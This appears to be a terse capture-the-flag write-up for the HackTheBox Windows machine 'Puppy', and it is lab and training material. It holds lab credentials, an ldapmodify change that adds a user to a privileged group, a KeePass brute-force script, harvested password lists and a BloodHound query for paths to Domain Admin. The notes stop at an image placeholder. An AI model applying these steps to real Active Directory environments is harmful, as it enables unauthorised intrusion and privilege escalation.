# Puppy

## 📌 Box Info

- **OS**: [Windows](Windows)
- **Difficulty**: [Medium](Medium)
- Platform: [HTB](HTB)

creds

levi.james / KingofAkron2025!

53/tcp   open  domain        Simple DNS Plus
[88](Kerberos)/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-21 08:38:48Z)
[111]/tcp  open  [rpcbind](RPC)     2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  2,3         2049/udp   nfs
|   100005  1,2,3       2049/udp   mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100024  1           2049/tcp   status
|_100024  1           2049/udp   status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3260/tcp open  iscsi?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)


smbmap -H 10.10.11.70 -u levi.james -p KingofAkron2025!

IPC$
NETLOGON
SYSVOL


add.ldif
```
dn: CN=DEVELOPERS,DC=PUPPY,DC=HTB
changetype: modify
add: member
member: CN=LEVI B. JAMES,OU=MANPOWER,DC=PUPPY,DC=HTB
```

```
ldapmodify -x -H ldap://10.10.11.70 -D "CN=LEVI B. JAMES,OU=MANPOWER,DC=puppy,DC=htb" -w 'KingofAkron2025!' -f add.ldif
```

```
net rpc group members "DEVELOPERS" -U "levi.james" -S 10.10.11.70
```

we check our perms again

```
smbmap -H 10.10.11.70 -u levi.james -p KingofAkron2025!
```

we view dev

```
smbclient //10.10.11.70/DEV -U levi.james
```

brute-kdbx.sh
```bash
#!/bin/bash

DB="recovery.kdbx"
WORDLIST="/usr/share/wordlists/rockyou.txt"

echo "[*] Starting brute-force on $DB using $WORDLIST"

while IFS= read -r password; do
    echo "[*] Trying: $password"

    echo "$password" | keepassxc-cli db-info "$DB" &>/dev/null

    if [ $? -eq 0 ]; then
        echo "[+] SUCCESS! Password found: $password"
        exit 0
    fi
done < "$WORDLIST"

echo "[-] Brute-force finished. No valid password found."
```

keepassxc recovery.kdbx

enter liverpool

create our user file and password file

user
```
ant.edwards
adam.silver
jamie.williamson
samuel.blake
steve.tucker
```

password
```
Antman2025!
JamieLove2025!
ILY2025!
Steve2025!
HJKL2025!
```

revisit bloodhound

```
MATCH p=shortestPath((n {owned:true})-[:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GPLink|AddAllowedToAct|AllowedToAct|WriteAccountRestrictions|SQLAdmin|ReadGMSAPassword|HasSIDHistory|CanPSRemote|SyncLAPSPassword|DumpSMSAPassword|AZMGGrantRole|AZMGAddSecret|AZMGAddOwner|AZMGAddMember|AZMGGrantAppRoles|AZNodeResourceGroup|AZWebsiteContributor|AZLogicAppContributo|AZAutomationContributor|AZAKSContributor|AZAddMembers|AZAddOwner|AZAddSecret|AZAvereContributor|AZContains|AZContributor|AZExecuteCommand|AZGetCertificates|AZGetKeys|AZGetSecrets|AZGlobalAdmin|AZHasRole|AZManagedIdentity|AZMemberOf|AZOwns|AZPrivilegedAuthAdmin|AZPrivilegedRoleAdmin|AZResetPassword|AZUserAccessAdministrator|AZAppAdmin|AZCloudAppAdmin|AZRunsAs|AZKeyVaultContributor|AZVMAdminLogin|AZVMContributor|AZLogicAppContributor|AddSelf|WriteSPN|AddKeyCredentialLink|DCSync*1..]->(m:Group {name:"DOMAIN ADMINS@PUPPY.HTB"})) WHERE NOT n=m RETURN p
```

look to see chain from ant.edwards to domain admin

![[Pasted image 20250522011631.png]]
